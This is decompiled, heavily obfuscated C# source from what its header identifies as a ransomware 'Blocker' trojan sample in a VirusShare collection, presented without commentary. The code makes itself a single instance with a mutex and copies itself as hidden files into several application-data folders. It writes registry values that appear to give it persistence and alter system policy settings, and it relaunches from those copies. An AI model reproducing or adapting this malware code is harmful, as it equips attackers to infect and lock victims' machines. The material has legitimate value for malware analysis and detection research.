// Decompiled with JetBrains decompiler
// Type: M6-n.3O
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using M\u000E6\u002Dn\u0008.\u0014\u003E;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0002\u0094\u0005;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0016Ah\u0011\u0013\u0012\u001FRC;
using M\u000E6\u002Dn\u0008.\u0020\u001A\u000F\u000Bi\u003E\u001BO.\u0083_\u0040E\u003C\u0028\u0021;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace M\u000E6\u002Dn\u0008
{
  internal class \u0033\u0017O\u0002
  {
    public static RegistryKey \u001D\u0022;
    private static Mutex \u0016;

    public static void \u002A4_H(string[] _param0)
    {
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u001F\u0007\u0083y\u0007\u0015\u001B\u0005\u0007();
      m\u003D\u000D.\u005CP\u00277g\u000B();
      if (string.Join(Convert.ToString(32), _param0) == \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.L\u0007B\u0010\u0024\u000C\u0014a\u0016())
      {
        Process.Start(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA);
        Environment.Exit(0);
      }
      \u0033\u0017O\u0002.\u001D\u0022 = !m\u003D\u000D.\u002C\u002E\u001C\u007B ? Registry.CurrentUser : Registry.LocalMachine;
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u003A\u0020\u0016(), true).DeleteSubKey(m\u003D\u000D.\u0029\u0020\u0018);
      }
      catch
      {
      }
      \u0033\u0017O\u0002.\u0031M();
      \u0033\u0017O\u0002.\u0001\u001E();
      \u0033\u0017O\u0002.\u0029();
      .\u001Bd\u00023();
      \u001C\u001DN.Q6\u001B\u000Ew\u0006\u003F();
      \u001CfS\u008B.e\u0016\u000F\u001B\u0018\u00218();
      \u0024\u003B\u003A\u0015\u002E.QX\u0023\u0027A\u0011();
    }

    private static void \u0029()
    {
      if (m\u003D\u000D.\u002C\u002E\u001C\u007B)
      {
        m\u003D\u000D.\u0012\u0024\u0015\u0005[0] = string.Format(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0014\u0009\u0083(), (object) Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[0]);
        m\u003D\u000D.\u0012\u0024\u0015\u0005[1] = string.Format(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0014\u0009\u0083(), (object) Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles), (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[1]);
      }
      else
      {
        m\u003D\u000D.\u0012\u0024\u0015\u0005[0] = string.Format(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0014\u0009\u0083(), (object) Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[0]);
        m\u003D\u000D.\u0012\u0024\u0015\u0005[1] = string.Format(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0014\u0009\u0083(), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[1]);
      }
      if (!\u0033\u0017O\u0002.\u0036\u001A\u0008\u005E())
      {
        foreach (string str in m\u003D\u000D.\u0012\u0024\u0015\u0005)
        {
          if (!VG.\u005C`(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA, str))
          {
            try
            {
              if (File.Exists(str))
                File.Delete(str);
              File.Copy(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA, str, true);
              File.SetAttributes(str, FileAttributes.Hidden | FileAttributes.Archive);
            }
            catch
            {
            }
          }
        }
        try
        {
          if (\u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.Fe\u005B\u0004\u0020L\u001C\u000C\u009D()) == null)
            \u0033\u0017O\u0002.\u001D\u0022.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.Fe\u005B\u0004\u0020L\u001C\u000C\u009D());
        }
        catch
        {
        }
        try
        {
          if (\u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001F\u003F()) == null)
            \u0033\u0017O\u0002.\u001D\u0022.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001F\u003F());
        }
        catch
        {
        }
        try
        {
          \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.Fe\u005B\u0004\u0020L\u001C\u000C\u009D(), true).SetValue(m\u003D\u000D.\u0018\u000EA\u000B[0], (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[0]);
          \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001F\u003F(), true).SetValue(m\u003D\u000D.\u0018\u000EA\u000B[1], (object) m\u003D\u000D.\u0012\u0024\u0015\u0005[1]);
        }
        catch
        {
        }
        try
        {
          if (Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.K1F\u001B\u001E\u005C99\u0090() + m\u003D\u000D.\u0029\u0020\u0018) == null)
            Registry.LocalMachine.CreateSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.K1F\u001B\u001E\u005C99\u0090() + m\u003D\u000D.\u0029\u0020\u0018);
          using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.K1F\u001B\u001E\u005C99\u0090() + m\u003D\u000D.\u0029\u0020\u0018, true))
          {
            registryKey.SetValue(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0032\u0005\u003AL(), (object) (m\u003D\u000D.\u0012\u0024\u0015\u0005[0] + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.UT()));
            registryKey.SetValue(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002B\u0011(), (object) 1, RegistryValueKind.DWord);
          }
        }
        catch
        {
        }
      }
      if (m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA != m\u003D\u000D.\u0012\u0024\u0015\u0005[0])
      {
        if (m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA != m\u003D\u000D.\u0012\u0024\u0015\u0005[1])
        {
          try
          {
            \u0033\u0017O\u0002.\u0016.Close();
            foreach (string fileName in m\u003D\u000D.\u0012\u0024\u0015\u0005)
              Process.Start(fileName);
          }
          catch
          {
          }
          Environment.Exit(0);
        }
      }
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u0011S\u0021\u0011\u0021\u0007\u0023\u002AZ(ref m\u003D\u000D.\u002A);
    }

    public static void BB\u000C()
    {
      \u0024\u003B\u003A\u0015\u002E._WB\u000C\u0004();
      .\u001E\u001D\u0015\u001Dbo\u0013();
      try
      {
        \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.Fe\u005B\u0004\u0020L\u001C\u000C\u009D(), true).DeleteValue(m\u003D\u000D.\u0018\u000EA\u000B[0]);
        \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001F\u003F(), true).DeleteValue(m\u003D\u000D.\u0018\u000EA\u000B[1]);
        Registry.LocalMachine.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u003A\u0020\u0016(), true).DeleteSubKey(m\u003D\u000D.\u0029\u0020\u0018);
      }
      catch
      {
      }
      foreach (string path in m\u003D\u000D.\u0012\u0024\u0015\u0005)
      {
        try
        {
          if (File.Exists(path))
            File.Delete(path);
        }
        catch
        {
        }
      }
      try
      {
        \u0033\u0017O\u0002.\u0016.Close();
      }
      catch
      {
      }
    }

    private static bool \u0036\u001A\u0008\u005E()
    {
      foreach (string str in m\u003D\u000D.\u0012\u0024\u0015\u0005)
      {
        if (!VG.\u005C`(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA, str))
          return false;
      }
      return true;
    }

    private static void \u0001\u001E()
    {
      try
      {
        \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002B\u002Fv\u0080(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0017\u0016\u0026\u0010\u003E\u00269\u0021\u001C(), (object) 2, RegistryValueKind.DWord);
        \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002B\u002Fv\u0080(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0038\u001A\u002FF\u0022\u0011ME4(), (object) 0, RegistryValueKind.DWord);
        \u0033\u0017O\u0002.\u001D\u0022.OpenSubKey(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u005EI5(), true).SetValue(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001EVk\u0020\u001C\u002E\u0017(), (object) 0, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void \u0031M()
    {
      try
      {
        \u0033\u0017O\u0002.\u0016 = new Mutex(true, m\u003D\u000D.\u0029\u0020\u0018);
        \u0033\u0017O\u0002.\u0016.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(0);
      }
    }
  }
}
